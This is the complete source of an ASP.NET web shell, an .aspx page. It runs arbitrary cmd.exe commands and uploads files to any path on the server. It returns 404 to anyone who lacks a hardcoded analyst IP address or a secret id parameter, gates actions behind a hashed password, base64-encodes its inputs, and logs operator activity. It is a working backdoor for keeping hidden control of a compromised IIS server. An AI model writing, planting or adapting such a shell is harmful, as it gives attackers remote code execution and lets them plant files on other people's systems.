<%@ Page Language="C#" validateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    
    string analystIP = "45.135.180.78";
    string logPath = "c:\\inetpub\\wwwroot\\logs\\hk.log";

    protected override void OnLoad(EventArgs e)
    {
       
        if (Request.UserHostAddress != analystIP &&
            (String.IsNullOrEmpty(Request["id"]) || Request["id"] != "dfc983c59b6efa7ff22c0e1e54473737267f61f8"))
        {
            Response.Clear();
            Response.StatusCode = 404;
            Context.ApplicationInstance.CompleteRequest();
            Response.End();
        }
    }

    protected bool check(string p)
    {
        try
        {
            if (Request.UserHostAddress == analystIP) return true; 
            return BitConverter.ToString(
                (new SHA1CryptoServiceProvider()).ComputeHash(Encoding.UTF8.GetBytes(p))
            ).Replace("-", "") == "CDA725F5E38DB2CBBCAB9251BA4A50EDBEA636E8";
        }
        catch (Exception ex)
        {
            lblresultshow.Text = ex.Message;
            return false;
        }
    }

    protected void filup(object sender, EventArgs e)
    {
        try
        {
            string decodedCode = Encoding.UTF8.GetString(Convert.FromBase64String(code.Text));
            if (check(decodedCode))
            {
                if (flup.PostedFile != null && flup.PostedFile.ContentLength > 0)
                {
                    string path = Encoding.UTF8.GetString(Convert.FromBase64String(flremoteaddr.Text));
                    string name = Path.GetFileName(flup.PostedFile.FileName);
                    string full = Path.Combine(path, name);
                    flup.PostedFile.SaveAs(full);
                    lblresultshow.Text = "OK";
                    File.AppendAllText(logPath, $"{DateTime.Now} [UPLOAD] from {Request.UserHostAddress} → {full}\n");
                }
            }
        }
        catch (Exception ex) { lblresultshow.Text = ex.Message; }
    }

    protected void cmrn(object sender, EventArgs e)
    {
        try
        {
            string decodedCmd = Encoding.UTF8.GetString(Convert.FromBase64String(cm.Text));
            string decodedCode = Encoding.UTF8.GetString(Convert.FromBase64String(code.Text));

            if (check(decodedCode))
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();

                p.StandardInput.WriteLine(decodedCmd);
                p.StandardInput.WriteLine("exit");
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                p.Close();

                lblresultshow.Text = "<pre>" + output.Replace(">", "&gt;").Replace("<", "&lt;").Replace(Environment.NewLine, "<br />") + "</pre>";
                File.AppendAllText(logPath, $"{DateTime.Now} [CMD] from {Request.UserHostAddress} → {decodedCmd}\n");
            }
            else
            {
                Response.Clear();
                Response.StatusCode = 404;
                Context.ApplicationInstance.CompleteRequest();
                Response.End();
            }
        }
        catch (Exception ex) { lblresultshow.Text = ex.Message; }
    }
</script>

<!DOCTYPE html>
<html>
<script>
function enc(){
	document.getElementById("code").value=btoa(document.getElementById("code").value);
	document.getElementById("cm").value=btoa(document.getElementById("cm").value);
	document.getElementById("flremoteaddr").value=btoa(document.getElementById("flremoteaddr").value);
}
function dec(){
	document.getElementById("code").value=atob(document.getElementById("code").value);
	document.getElementById("cm").value=atob(document.getElementById("cm").value);
	document.getElementById("flremoteaddr").value=atob(document.getElementById("flremoteaddr").value);
}
</script>
<body onload="dec()" style="background:#002896; color:#FFF; font-size:18px; font-family:tahoma;">

<form id="frmshl" runat="server" onsubmit=enc()>
	<div><asp:TextBox ID="code" runat="server" Width="10%"/></div>
	<div><asp:TextBox ID="id" runat="server" Width="10%"/></div>
	<hr>
	<div><asp:TextBox ID="cm" runat="server" Width="50%"/>
	<asp:Button ID="btncm" runat="server" OnClick="cmrn" Text="Execute"/></div>
	<hr>
	<div><input type="file" id="flup" runat="server"/></div>
	<% if(flremoteaddr.Text==""){flremoteaddr.Text=Server.MapPath(".");} %>
	<div><asp:TextBox ID="flremoteaddr" runat="server" Width="50%"/>
	<asp:Button ID="btnup" runat="server" OnClick="filup" Text="Upload"/></div>
	<hr>
	<asp:Label ID="lblresultshow" runat="server"/>
</form>
</body>
</html>